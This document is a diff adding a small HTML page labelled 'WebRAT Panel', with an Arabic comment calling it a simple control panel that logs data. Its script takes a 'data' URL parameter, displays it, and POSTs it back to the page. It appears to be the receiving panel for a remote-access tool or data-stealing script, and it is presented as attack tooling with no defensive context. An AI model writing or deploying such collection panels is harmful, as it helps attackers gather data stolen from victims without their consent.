@@ -1,0 +1,18 @@
+<!-- لوحة تحكم بسيطة تسجل البيانات -->
+<!DOCTYPE html>
+<html>
+<body>
+<h2>🕹️ WebRAT Panel</h2>
+<div id="logs"></div>
+<script>
+const params = new URLSearchParams(location.search);
+if(params.get('data')) {
+    let logDiv = document.getElementById('logs');
+    let newEntry = document.createElement('pre');
+    newEntry.innerText = decodeURIComponent(params.get('data'));
+    logDiv.prepend(newEntry);
+    fetch(location.href.split('?')[0], {method:'POST', body:params.get('data')});
+}
+</script>
+</body>
+</html>
